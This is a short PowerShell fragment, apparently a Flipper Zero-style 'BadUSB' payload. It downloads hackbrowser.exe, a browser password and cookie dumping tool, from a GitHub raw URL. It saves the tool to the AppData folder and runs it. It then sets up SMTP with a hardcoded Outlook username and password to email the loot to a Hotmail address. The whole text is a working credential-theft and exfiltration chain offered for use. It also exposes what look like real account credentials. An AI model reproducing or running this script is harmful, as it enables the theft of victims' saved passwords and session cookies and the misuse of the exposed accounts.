...
Invoke-WebRequest -Uri "https://github.com/rodrigosimionatodecarvalho/allscri/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
./hb.exe
...
$smtp.Credentials = New-Object System.Net.NetworkCredential("shibaflipper34@outlook.com", "doggoshiba24");
$smtp.EnableSsl = $true
$Message.From = "shibaflipper34@outlook.com"
$Message.To.Add("rodrigo_rsc@hotmail.com")
